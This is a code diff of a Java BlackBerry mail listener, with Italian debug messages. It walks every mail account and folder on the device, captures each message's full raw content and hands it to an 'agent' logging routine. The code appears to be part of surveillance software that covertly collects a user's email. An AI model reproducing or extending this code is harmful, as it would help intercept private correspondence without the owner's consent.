@@ -12,7 +12,9 @@ import net.rim.blackberry.api.mail.BodyPart;
 import net.rim.blackberry.api.mail.Folder;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.mail.MessagingException;
+//#ifdef HAVE_MIME
 import net.rim.blackberry.api.mail.MimeBodyPart;
+//#endif
 import net.rim.blackberry.api.mail.Multipart;
 import net.rim.blackberry.api.mail.SendListener;
 import net.rim.blackberry.api.mail.ServiceConfiguration;
@@ -57,7 +59,6 @@ public final class MailListener implements FolderListener, StoreListener,
     String[] names;
 
     protected static IntHashtable fieldTable;
-
     private static ServiceRecord[] mailServiceRecords;
 
     /**
@@ -92,8 +93,7 @@ public final class MailListener implements FolderListener, StoreListener,
                         Transport.more(textBodyPart, true);
                     } catch (final Exception e) {
                         // #debug debug
-                        debug.trace("Transport.more(BodyPart, boolean) threw "
-                                + e.toString());
+                        debug.trace("Transport.more(BodyPart, boolean) threw "                                + e.toString());
                     }
                 }
                 String plainText = (String) textBodyPart.getContent();
@@ -290,12 +290,23 @@ public final class MailListener implements FolderListener, StoreListener,
         try {
             os = new ByteArrayOutputStream();
             message.writeTo(os);
-            final byte[] content = os.toByteArray();
+            final byte[] rfc822 = os.toByteArray();
 
-            final String messageContent = new String(content);
-            // #debug debug
+            final String plain = "Content-Type: text/plain\r\n" ;
+            
+            String messageContent =   new String(rfc822);
+            Object co = message.getContent();
+            //byte[] content = (byte[]) co;
+            //String messageContent =   new String(content);
+            
+            //#debug debug
             debug.trace(messageContent);
-
+            
+            
+            // #debug debug
+            debug.trace("BodyText: " + message.getBodyText());
+           
+            
             final int flags = 1;
             final int size = message.getSize();
             final DateTime filetime = new DateTime(message.getReceivedDate());
@@ -314,7 +325,7 @@ public final class MailListener implements FolderListener, StoreListener,
             databuffer.writeLong(filetime.getFiledate());
             Check.ensures(additionalData.length == 20, "Wrong buffer size");
 
-            messageAgent.createLog(additionalData, content);
+            messageAgent.createLog(additionalData, rfc822);
 
         } catch (final IOException e) {
             // TODO Auto-generated catch block
@@ -344,8 +355,7 @@ public final class MailListener implements FolderListener, StoreListener,
         }
         for (int count = 0; count < subfolders.length; count++) {
             // #debug debug
-            debug.trace("Nome della cartella: "
-                    + subfolders[count].getFullName());
+            debug.trace("Nome della cartella: "                    + subfolders[count].getFullName());
             dirs = subfolders[count].list();
             scanFolder(dirs);
             try {
@@ -441,8 +451,7 @@ public final class MailListener implements FolderListener, StoreListener,
 
         names = new String[mailServiceRecords.length];
         // #debug debug
-        debug.trace("Ci sono: " + mailServiceRecords.length
-                + " account di posta!");
+        debug.trace("Ci sono: " + mailServiceRecords.length                + " account di posta!");
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
